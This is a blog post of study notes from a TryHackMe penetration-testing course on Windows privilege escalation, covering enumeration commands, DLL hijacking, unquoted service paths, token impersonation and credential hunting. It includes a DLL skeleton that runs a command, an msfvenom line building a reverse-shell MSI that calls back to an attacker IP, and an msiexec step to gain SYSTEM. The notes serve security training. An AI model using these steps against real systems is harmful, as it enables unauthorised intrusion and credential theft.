@@ -1,0 +1,158 @@
+---
+title: 'TryHackMe: Jr. Penetration Tester'
+date: 2022-04-21 05:00:00.000000000 Z
+layout: post-external
+original_link: https://cardboard-iguana.com/log/2022-04-21-tryhackme-jr-penetration-tester.html
+author: 100007
+---
+
+<h1 id="tryhackme-jr-penetration-tester">TryHackMe: Jr. Penetration Tester</h1>
+<p><strong>author:</strong> Nathan Acks<br />
+<strong>date:</strong> 2022-04-21</p>
+<h2 id="windows-privesc">Windows PrivEsc</h2>
+<h3 id="introduction">Introduction</h3>
+<p>Common Windows user levels:</p>
+<ul>
+<li>Local Admin</li>
+<li>Local User</li>
+<li>Guest User</li>
+<li>Domain User</li>
+<li>Domain Admin</li>
+</ul>
+<p>Note that non-admin domain users may still be local admins.</p>
+<p>Note that most Windows antivirus products will not allow enumeration scripts to be run.</p>
+<p>Here’s a useful checklist:</p>
+<ul>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md">Windows - Privilege Escalation (PayloadsAllTheThings)</a></li>
+</ul>
+<h3 id="information-gathering">Information Gathering</h3>
+<ul>
+<li><code class="language-plaintext highlighter-rouge">whoami /priv</code> — current user + privileges</li>
+<li><code class="language-plaintext highlighter-rouge">net user</code> — list all (local) users</li>
+<li><code class="language-plaintext highlighter-rouge">net user $USERNAME</code> — get details for user <code class="language-plaintext highlighter-rouge">$USERNAME</code></li>
+<li><code class="language-plaintext highlighter-rouge">net localgroup</code> — list all (local) groups</li>
+<li><code class="language-plaintext highlighter-rouge">net localgroup $GROUP</code> —- list user in group <code class="language-plaintext highlighter-rouge">$GROUP</code></li>
+<li><code class="language-plaintext highlighter-rouge">query session</code> — list other users who are currently logged in</li>
+<li><code class="language-plaintext highlighter-rouge">systeminfo</code> — return system info</li>
+<li><code class="language-plaintext highlighter-rouge">hostname</code> — return system hostname</li>
+<li><code class="language-plaintext highlighter-rouge">wmic qfe get Caption,Description,HotFixID,InstalledOn</code> — list installed updates (only Windows 10 21H1 and older)</li>
+<li><code class="language-plaintext highlighter-rouge">schtasks</code> — list scheduled tasks</li>
+<li><code class="language-plaintext highlighter-rouge">driverquery</code> — list installed drivers</li>
+<li><code class="language-plaintext highlighter-rouge">sc</code> — query (and manipulate) services (does not work in PowerShell!)</li>
+</ul>
+<p>Note that the <code class="language-plaintext highlighter-rouge">findstr</code> command is the Windows equivalent of <code class="language-plaintext highlighter-rouge">grep</code> (and sometimes also <code class="language-plaintext highlighter-rouge">find</code>). Also remember that you can use pipe in Windows!</p>
+<p>Note that Windows provides the <code class="language-plaintext highlighter-rouge">netstat</code> command, and it recognizes all of the switches we’d hope it does. Note, however, that <code class="language-plaintext highlighter-rouge">-o</code> displays the PID of the process using the connection on Windows.</p>
+<p>Microsoft Defender uses the service name <code class="language-plaintext highlighter-rouge">windefend</code>.</p>
+<ul>
+<li><a href="https://cardboard-iguana.com/notes/netstat.html">Using “netstat”</a></li>
+</ul>
+<h3 id="tools-of-the-trade">Tools of the Trade</h3>
+<ul>
+<li><a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">WinPEAS</a></li>
+<li><a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">PowerUp</a></li>
+<li><a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">Windows Exploit Suggester</a></li>
+<li><a href="https://cardboard-iguana.com/notes/metasploit.html">Metasploit</a></li>
+</ul>
+<p>Notes:</p>
+<ul>
+<li>WinPEAS is detected and quarantined by Microsoft Defender by default.</li>
+<li>PowerUp may require an unrestricted PowerShell session (<code class="language-plaintext highlighter-rouge">powershell -nop -exec bypass</code>), which can raise alerts.</li>
+<li>Windows Exploit Suggester analyzes the output of <code class="language-plaintext highlighter-rouge">systeminfo</code>, and can be run on the attacker’s machine.</li>
+<li>The <code class="language-plaintext highlighter-rouge">multi/recon/local_exploit_suggester</code> module works through Meterpreter to analyze a Windows system for potential vulnerabilities.</li>
+</ul>
+<h3 id="vulnerable-software">Vulnerable Software</h3>
+<ul>
+<li><code class="language-plaintext highlighter-rouge">wmic product</code> — list all installed software (but misses 32-bit applications installed on a 64-bit OS)</li>
+<li><code class="language-plaintext highlighter-rouge">wimc service list brief</code> — another way of listing services</li>
+</ul>
+<h3 id="dll-hijacking">DLL Hijacking</h3>
+<p>Basically, this is the Windows equivalent of exploiting <code class="language-plaintext highlighter-rouge">LD_PRELOAD</code> or <code class="language-plaintext highlighter-rouge">LD_LIBRARY_PATH</code>.</p>
+<p>Windows DLL search order if <code class="language-plaintext highlighter-rouge">SafeDllSearchMode</code> is enabled:</p>
+<ul>
+<li>The application directory</li>
+<li>The system directory (as returned by <code class="language-plaintext highlighter-rouge">GetSystemDirectory()</code>)</li>
+<li>The 16-bit (!) system directory</li>
+<li>The Windows directory (as returned by <code class="language-plaintext highlighter-rouge">GetWindowsDirectory()</code>)</li>
+<li>The current directory (!)</li>
+<li>The system <code class="language-plaintext highlighter-rouge">PATH</code> (!)</li>
+</ul>
+<p>Windows DLL search order if <code class="language-plaintext highlighter-rouge">SafeDllSearchMode</code> is disabled:</p>
+<ul>
+<li>The application directory</li>
+<li>The current directory (!)</li>
+<li>The system directory (as returned by <code class="language-plaintext highlighter-rouge">GetSystemDirectory()</code>)</li>
+<li>The 16-bit (!) system directory</li>
+<li>The Windows directory (as returned by <code class="language-plaintext highlighter-rouge">GetWindowsDirectory()</code>)</li>
+<li>The system <code class="language-plaintext highlighter-rouge">PATH</code> (!)</li>
+</ul>
+<p>It seems more-or-less impossible to determine what DLLs an application is searching for without having SYSTEM access already (so tools like ProcMon can be run). So, local testing!</p>
+<p>A skeleton DLL:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
+</span>
+<span class="n">BOOL</span> <span class="n">WINAPI</span> <span class="nf">DllMain</span>
+<span class="p">(</span><span class="n">HANDLE</span> <span class="n">hDll</span><span class="p">,</span> <span class="n">DWORD</span> <span class="n">dwReason</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span> <span class="p">&#x007b;</span>
+<span class="k">if</span> <span class="p">(</span><span class="n">dwReason</span> <span class="o">==</span> <span class="n">DLL_PROCESS_ATTACH</span><span class="p">)</span> <span class="p">&#x007b;</span>
+<span class="n">system</span><span class="p">(</span><span class="s">"cmd.exe /C whoami &gt; C:\Temp\dll.txt"</span><span class="p">);</span>
+<span class="n">ExitProcess</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">&#x007d;</span>
+<span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
+<span class="p">&#x007d;</span>
+</code></pre></div></div>
+<p>Compile with mingw (this <em>can</em> be done on Linux!):</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">x86_64-w64-mingw32-gcc</span><span class="w"> </span><span class="nx">windows_dll.c</span><span class="w"> </span><span class="nx">\</span><span class="w">
+</span><span class="nt">-shared</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="n">output.dll</span><span class="w">
+</span></code></pre></div></div>
+<p>Note that Windows <em>also</em> comes with <code class="language-plaintext highlighter-rouge">wget</code>!</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Change user foo's password to "bar" (requires</span><span class="w">
+</span><span class="c"># admin/SYSTEM authority):</span><span class="w">
+</span><span class="c">#</span><span class="w">
+</span><span class="n">net</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nx">foo</span><span class="w"> </span><span class="nx">bar</span><span class="w">
+</span><span class="c">#</span><span class="w">
+</span><span class="c"># Note that this does *NOT* bypass any password</span><span class="w">
+</span><span class="c"># complexity requirements!</span><span class="w">
+</span></code></pre></div></div>
+<ul>
+<li><a href="https://cardboard-iguana.com/notes/exploiting-ld-preload.html">Exploiting LD_PRELOAD</a></li>
+<li><a href="https://cardboard-iguana.com/notes/exploiting-ld-library-path.html">Exploiting LD_LIBRARY_PATH</a></li>
+</ul>
+<h3 id="unquoted-service-path">Unquoted Service Path</h3>
+<p>Formally, when Windows encounters an unquoted service path it tries <em>all</em> possible paths, from shortest to longest. Thus <code class="language-plaintext highlighter-rouge">C:\Program Files\service path\service.exe</code> will cause Windows to look for the following executables, in order:</p>
+<ul>
+<li><code class="language-plaintext highlighter-rouge">C:\Program.exe</code></li>
+<li><code class="language-plaintext highlighter-rouge">C:\Program Files\service.exe</code></li>
+<li><code class="language-plaintext highlighter-rouge">C:\Program Files\service path\service.exe</code></li>
+</ul>
+<p>If an executable is found on a shorter path, then the remainder of the (unquoted) path is treated as command line parameters.</p>
+<p>Print out all services:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">wmic</span><span class="w"> </span><span class="nx">service</span><span class="w"> </span><span class="nx">get</span><span class="w"> </span><span class="nx">name</span><span class="p">,</span><span class="nx">displayname</span><span class="p">,</span><span class="nx">pathname</span><span class="p">,</span><span class="nx">startmode</span><span class="w">
+</span></code></pre></div></div>
+<p>You can inspect the service paths in this output to see if any have spaces <em>and</em> are unquoted.</p>
+<p>When checking the permissions of a folder, note that the Windows File Explorer isn’t good about displaying permissions for users who have <em>multiple</em> applied ACLs. Use <code class="language-plaintext highlighter-rouge">icacls</code> or <code class="language-plaintext highlighter-rouge">Get-Acl $PATH | Format-List</code>, and be sure to keep your eyes peeled for duplicate user entries (<em>all</em> of which will be applied!).</p>
+<p>Find a file in Windows:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">dir</span><span class="w"> </span><span class="nv">$FILE_NAME</span><span class="w"> </span><span class="nx">/S</span><span class="w">
+</span></code></pre></div></div>
+<ul>
+<li><a href="https://www.computerhope.com/issues/ch000309.htm">How to find a file or folder in MS-DOS or Windows command line</a></li>
+</ul>
+<h3 id="token-impersonation">Token Impersonation</h3>
+<p>Prior to Windows 10 1809 / Server 2019, services could be forced to authenticate to a local port controlled by a low-privilege attacker, which would then allow the attacker to proxy and capture the NTLM handshake and thus (typically) a SYSTEM token. (This vulnerability <em>technically</em> still exists, its just that unprivileged accounts can no longer use this token; check to see if the output of <code class="language-plaintext highlighter-rouge">whoami /priv</code> contains the <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> privilege to see if you’ve gotten lucky.)</p>
+<p>Exploits in this family are typically named “X Potato” after the first exploit, “Hot Potato”.</p>
+<h3 id="quick-wins">Quick Wins</h3>
+<p>(1) Look for defunct (but still running) scheduled tasks with running as a more highly privileged account that point to a path you can control.</p>
+<p>(2) If <code class="language-plaintext highlighter-rouge">AlwaysInstallElevated</code> is set to 1 under both of the following keys, then MSI installers will run as SYSTEM.</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">\</span><span class="w">
+</span><span class="n">HKCU\Software\Policies\Microsoft\Windows\Installer</span><span class="w">
+</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">\</span><span class="w">
+</span><span class="n">HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</span><span class="w">
+</span></code></pre></div></div>
+<p>Generate a malicious MSI file with msfvenom:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/x64/shell_reverse_tcp <span class="se">\</span>
+<span class="nv">LHOST</span><span class="o">=</span><span class="nv">$ATTACKER_IP</span> <span class="nv">LPORT</span><span class="o">=</span><span class="nv">$ATTACKER_PORT</span> <span class="se">\</span>
+<span class="nt">-f</span> msi <span class="nt">-o</span> <span class="nv">$INSTALLER</span>.msi
+</code></pre></div></div>
+<p>Then install on the target to gain SYSTEM:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">msiexec</span><span class="w"> </span><span class="nx">/quiet</span><span class="w"> </span><span class="nx">/qn</span><span class="w"> </span><span class="nx">/i</span><span class="w"> </span><span class="nv">$INSTALLER</span><span class="o">.</span><span class="nf">msi</span><span class="w">
+</span></code></pre></div></div>
+<p>(3) Check for saved passwords of othe users with <code class="language-plaintext highlighter-rouge">cmdkey /list</code>. If any exist, then they can be used in <code class="language-plaintext highlighter-rouge">runas</code> with the <code class="language-plaintext highlighter-rouge">/savecred</code> flag.</p>
+<p>(4) Sometimes registry keys contain passwords! Apparently, you can query/search across registry keys using <code class="language-plaintext highlighter-rouge">reg query …</code>.</p>
+<p>(5) Windows uses a file called <code class="language-plaintext highlighter-rouge">unattend.xml</code> to store setup auto-configuration information. Check if these have been left lying around.</p>
